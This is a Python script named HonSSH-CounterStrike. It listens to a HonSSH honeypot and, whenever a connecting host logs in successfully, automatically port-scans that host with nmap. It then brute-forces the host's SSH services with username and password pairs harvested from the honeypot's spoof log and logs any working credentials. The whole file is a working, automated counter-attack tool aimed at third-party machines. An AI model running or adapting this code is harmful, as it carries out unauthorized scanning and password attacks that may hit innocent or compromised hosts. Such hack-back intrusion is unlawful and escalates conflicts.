#!/usr/bin/env python

# WARNING: This is experimental!
# HonSSH CounterStrike SSH BruteForce using spoofed HonSSH auth creds!
# @TheRealCounterStrike

from twisted.python import log
from twisted.protocols.basic import LineReceiver
from twisted.internet import threads, protocol, defer
from twisted.internet.protocol import ReconnectingClientFactory, ProcessProtocol
from paramiko import SSHClient, Transport
from paramiko.client import AutoAddPolicy
from paramiko.ssh_exception import AuthenticationException
from sys import stdout, argv
from os import environ
from os.path import dirname
from copy import copy
import json, nmap, time, re

IGNORE_LOCALHOST=True
defer.setDebugging(False)
DEBUG=False
PLAIN = '\033[0m'
RED = '\033[0;31m'
LRED = '\033[1;31m'
GREEN = '\033[0;32m'
LGREEN = '\033[1;32m'
YELLOW = '\033[0;33m'
LYELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
LBLUE = '\033[1;34m'
PURPLE = '\033[0;35m'
LPURPLE = '\033[1;35m'
CYAN = '\033[0;36m'
LCYAN = '\033[1;36m'
Transport._CLIENT_ID = 'YourMom'


def msg(color, identifier, message):
    if not isinstance(message, basestring):
        message = repr(message)
    log.msg(color + identifier +  ' - ' + message + '\033[0m')

class SshTarget(object):
    def __init__(self):
        self.client = SSHClient()
        self.client.set_missing_host_key_policy(AutoAddPolicy)

    def fire(self, remote_tuple, user_pass_list):
        valid_logins = []
        for usern, passw in user_pass_list:
            try:
                self.client.connect(str(remote_tuple[0]),
                    look_for_keys=False,
                    allow_agent=False,
                    gss_deleg_creds=False,
                    gss_trust_dns=False,
                    auth_timeout=5.0,
                    banner_timeout=3.0,
                    timeout=3.0,
                    port=int(remote_tuple[1]),
                    username=usern,
                    password=passw
                )
            except AuthenticationException:
                pass
            except Exception as ex:
                msg(LRED, '[SSH][BRUTE-FORCE]',
                    '%s:%s - %s' %
                    (remote_tuple[0], remote_tuple[1], str(ex))
                )
            else:
                msg(LGREEN, '[SSH][BRUTE-FORCE]',
                    'LOGIN SUCCEEDED for <%s:%s> with user/pass %s/%s' %
                    (remote_tuple[0], remote_tuple[1], usern, passw)
                )
                valid_logins.append((usern, passw))
        return valid_logins

    @staticmethod
    def parseHonsshSpoofLog(user_pw_path=dirname(argv[0]) + '/logs/spoof.log'):
        result=[]
        try:
            with open(user_pw_path, 'r') as slog:
                for line in slog.readlines():
                    result.append(re.search(r'^(.*?) - (.*?) - ', line).groups())
        except Exception as ex:
            msg(RED, '[HONSSH][SPOOF-LOG]', 'Error: %s' % (str(ex)))
        return result

    @staticmethod
    def sshBruteForce(remote_ip, possible_ssh_ports):
        ssh = SshTarget()
        result = {}
        user_pass_list = SshTarget.parseHonsshSpoofLog()
        for possible_ssh_port in possible_ssh_ports:
            result[str(possible_ssh_port)] = \
                ssh.fire((remote_ip, possible_ssh_port), user_pass_list)
        return result

class NmapTarget(object):
    nm = nmap.PortScanner()
    nmap_output = None

    def fire(self, remote_ip):
        self.nmap_output = self.nm.scan(remote_ip, arguments='-sV -Pn --top-ports 2000')
        self.minn_output = self.nm.scan(remote_ip, arguments='-sV -Pn -p 22,2222,22050')
        self.nmap_output['scan'][remote_ip]['tcp'].update(self.minn_output['scan'][remote_ip]['tcp'])
        print json.dumps(self.nmap_output['scan'][remote_ip], indent=4, sort_keys=True)

class NmapReceiver(ProcessProtocol):
    json_output = ''

    def __init__(self, parent, remote_ip):
        self.parent = parent
        self.remote_ip = remote_ip

    def done(self, reason):
        msg(LGREEN, '[PROTOCOL][NMAP]', 'Scan <%s> finished. Result: <%s>' %
            (self.remote_ip, reason))

    def childDataReceived(self, childFD, data):
        if childFD == 1: self.json_output += data

    def errReceived(self, data):
        msg(LRED, '[PROTOCOL][NMAP]', 'Error received (%d bytes): <%s>' % (len(data), str(data)))

    def processEnded(self, reason):
        if reason.value.exitCode == 0:
            self.done('Nmap succeeded')
            self.parent.deferred.callback(
                (self.parent, self.remote_ip, self.json_output)
            )
        else:
            self.done(reason)
            raise Exception('NmapReceiver: nmap exited abnormally')

class JsonReceiver(LineReceiver):
    delimiter = '\n'

    def __init__(self, targets):
        self.targets = targets

    def lineReceived(self, data):
        if DEBUG:
            msg(PLAIN, '[PROTOCOL][DATA]', str(data))
        try:
            proto_json = json.loads(data)
        except ValueError as verr:
            msg(LRED, '[PROTOCOL][JSON]', str(verr))
        else:
            self.dispatch(proto_json)
            pass

    def isValidProtocol(self, proto_json):
        for key in ['event']:
            if key not in proto_json:
                msg(LRED, '[PROTOCOL][DISPATCH]', 'Missing json key/value `event`')
                return False
        return True

    def setProtocolData(self, proto_json):
        self.event     = proto_json['event']
        self.session   = proto_json.get('session', {})
        self.auths     = self.session.get('auths', [{}])
        self.remote_ip = self.session.get('peer_ip', None)
        self.country   = self.session.get('country', '')

    def isUnscannedRemote(self):
        return True if self.remote_ip not in self.targets else False

    def startSshBruteForce(self, possible_ssh_ports):
        msg(LBLUE, '[PROTOCOL][DISPATCH]', 'Initiating SSH brute force for <%s>..' %
            (self.remote_ip)
        )
        return SshTarget.sshBruteForce(self.remote_ip, possible_ssh_ports)

    def getPossibleSshServices(self):
        if self.remote_ip not in self.targets:
            return []
        port_list = []
        for key, val in self.targets[self.remote_ip]['tcp'].iteritems():
            if ('ssh' in val['product'].lower() \
               or 'ssh' in val['name'].lower() \
               or 'ssh' in val['cpe'].lower()) \
               and 'open' in val['state'].lower():
                   port_list.append(key)
        return port_list

    def startNmap(self, remote_ip):
        self.targets[remote_ip] = { 'scan_start' : time.time() }
        reactor.spawnProcess(
            NmapReceiver(self, remote_ip),
            argv[0], [argv[0], "nmap", remote_ip],
            environ, usePTY=True
        )

    def start(self):
        def errorCallback(err):
            msg(RED, '[ERROR]', str(err))
        def nmapSucceeded((_self, remote_ip, json_output)):
            json_dict = json.loads(json_output)
            json_dict['scan_end'] = time.time()
            json_dict['scan_start'] = \
                _self.targets[remote_ip]['scan_start']
            _self.targets.update({remote_ip : json_dict})
            #print json.dumps(_self.targets, indent=4, sort_keys=True)
            ssh_services = _self.getPossibleSshServices()
            msg(LGREEN, '[PROTOCOL][NMAP]', 'Found %d usable SSH services: TCP%s' %
                (len(ssh_services), str(ssh_services))
            )
            if len(ssh_services) == 0:
                raise Exception('No open SSH services for <%s> found.' % (remote_ip))
            return (_self, ssh_services)
        def sshBruteForce((_self, port_list)):
            return (_self, _self.startSshBruteForce(port_list))
        def sshSucceeded((_self, upp)):
            for port, user_pw_list in upp.iteritems():
                if len(user_pw_list) > 0:
                    msg(LGREEN, '[PROTOCOL][DISPATCH]',
                        'SSH for <%s:%s> succeeded with %d valid Logins ..' %
                        (_self.remote_ip, str(port), len(user_pw_list))
                    )
                else:
                    msg(LRED, '[PROTOCOL][DISPATCH]', 'No valid SSH Logins for <%s:%s>.' %
                        (_self.remote_ip, str(port))
                    )

        s = copy(self)
        s.deferred = defer.Deferred()
        s.deferred.addCallbacks(nmapSucceeded, errorCallback)
        s.deferred.addCallback(sshBruteForce)
        s.deferred.addCallbacks(sshSucceeded, errorCallback)
        s.startNmap(s.remote_ip)

    def dispatch(self, proto_json):
        if not self.isValidProtocol(proto_json):
            return
        self.setProtocolData(proto_json)

        if IGNORE_LOCALHOST is True and self.remote_ip == '127.0.0.1':
            msg(LRED, '[PROTOCOL][DISPATCH]', 'IGNORE_LOCALHOST is enabled, ' \
                      'ignore connection from %s' % (self.remote_ip))
            return
        if 'connection_made' == self.event:
            msg(PLAIN, '[PROTOCOL][DISPATCH]', 'Incoming connection from <%s> <%s>' %
                (str(self.remote_ip), self.country))
        elif 'login_successful' == self.event and self.isUnscannedRemote() is True:
            msg(LCYAN, '[PROTOCOL][DISPATCH]', 'Starting counter attack on <%s> <%s>' % 
                (str(self.remote_ip), self.country))
            if self.remote_ip is None:
                msg(LRED, '[PROTOCOL][DISPATCH]', 'Missing json key/value(str) `peer_ip`')
                return
            self.start()

class CounterFactory(ReconnectingClientFactory):
    maxDelay = 5
    targets = {}

    def startedConnecting(self, connector):
        msg(PLAIN, '[FACTORY]', 'Started to connect')

    def buildProtocol(self, addr):
        msg(LGREEN, '[FACTORY]', 'Connected to %s' % (addr))
        return JsonReceiver(self.targets)

    def clientConnectionLost(self, connector, reason):
        msg(LYELLOW, '[FACTORY]', 'Lost connection.  Reason: %s' % (reason))
        self.retry(connector)

    def clientConnectionFailed(self, connector, reason):
        msg(LRED, '[FACTORY]', 'Connection failed. Reason: %s' % (reason))
        self.retry(connector)

if __name__ == '__main__':
    from sys import exit
    from twisted.internet import reactor

    if len(argv) == 3:
        # NMAP target
        if argv[1] == 'nmap':
            NmapTarget().fire(argv[2])
            exit(0)
        # SSH BruteForce target
        elif argv[1] == 'ssh':
            ip = argv[2].split(':')[0]
            port = argv[2].split(':')[1]
            print SshTarget.sshBruteForce(ip, [port])
            exit(0)

    if len(argv) == 0:
        exit(1)
    if len(argv) != 2:
        print('usage: %s [path-to-honssh-socket]' % (argv[0]))
        exit(2)

    log.startLogging(stdout)
    msg(LPURPLE, '[MAIN]', 'HonSSH-CounterStrike')
    msg(LPURPLE, '[MAIN]', '(C) 2018 by Toni Uhlig')
    msg(LPURPLE, '[MAIN]', 'WARNING: This software is experimental!')
    reactor.connectUNIX(argv[1], CounterFactory())
    reactor.run()

